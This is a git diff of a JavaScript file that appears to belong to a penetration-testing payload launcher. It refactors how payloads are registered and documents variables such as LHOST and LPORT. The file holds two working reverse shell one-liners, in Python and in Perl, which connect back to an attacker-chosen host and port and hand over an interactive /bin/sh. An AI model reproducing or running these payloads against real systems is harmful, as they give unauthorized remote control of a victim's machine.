@@ -1,9 +1,38 @@
 var prompt = require('prompt');
-// Payload Array
+
+// Initialize array and Payload Helper
 arrayTools = []
 
-// title, description, payload, category, and callback (optional: used for additional options if needed)
-$1={
+var Load = function(obj){
+	arrayTools.push(obj)
+}
+
+/* 
+###########################################
+############### Payloads ##################
+###########################################
+
+
+---[Payload Parameters]---
+
+Required: title, payload, and category
+Optional: callback (used for prompt variable)
+
+
+---[Variable Formatting]---
+
+* If variables aren't added properly, they will not work
+* Variables can include instructions if needed.
+* Instructions should be kept in parenthesis
+	
+	ex: foobar <RHOST> <LHOST> <LPORT>
+	ex: foobar <RHOST (hostname)> <RPORT>	 
+
+
+*/
+
+
+Load({
 	title: "Tools", 
 	description: "A reverse shell one liner written in python",
 	payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$$LHOST$$\",$$LPORT$$));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
@@ -14,19 +43,17 @@ $1={
 			returnToPrepare()
 		})
 	}
-}
+})
 
-$2={
+Load({
 	title: "Tools",
 	description: "A reverse shell one liner written in perl",
 	payload: "perl -e 'use Socket;$i=\"$$LHOST$$\";$p=$$LPORT$$;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
 	category: "Nmap",
 	callback: ""
-}
+})
 
 
-
-arrayTools.push($1,$2)
 
 var unique = []
 var uniqueCategories = []
